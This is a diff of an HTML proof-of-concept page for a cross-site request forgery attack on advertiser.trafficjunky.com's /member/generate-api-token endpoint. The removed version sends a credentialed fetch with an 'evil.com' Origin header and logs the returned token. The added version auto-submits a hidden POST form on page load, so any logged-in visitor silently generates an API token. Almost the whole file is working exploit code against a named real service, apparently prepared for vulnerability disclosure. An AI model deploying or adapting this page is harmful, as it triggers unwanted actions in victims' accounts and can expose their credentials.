@@ -1,19 +1,24 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <meta charset="utf-8">
+  <title>CSRF PoC – TrafficJunky API Token</title>
+</head>
 <body>
-<h1>Exploit Testing…</h1>
+  <h1>CSRF PoC – Silent API token generation</h1>
+  <p>If you are logged in to advertiser.trafficjunky.com,
+     this page will silently trigger the <code>/member/generate-api-token</code> endpoint.</p>
 
-<script>
-fetch("https://advertiser.trafficjunky.com/member/generate-api-token", {
-    method: "POST",
-    credentials: "include",
-    headers: {
-        "Origin": "https://evil.com",
-        "X-Requested-With": "XMLHttpRequest"
-    }
-})
-.then(r => r.text())
-.then(d => console.log("TOKEN:", d));
-</script>
+  <!-- Invisible auto-submitting form -->
+  <form id="csrfForm"
+        action="https://advertiser.trafficjunky.com/member/generate-api-token"
+        method="POST">
+    <!-- No fields required: original request uses POST with empty body -->
+  </form>
+
+  <script>
+    // Auto-submit the form as soon as the page loads
+    document.getElementById("csrfForm").submit();
+  </script>
 </body>
 </html>
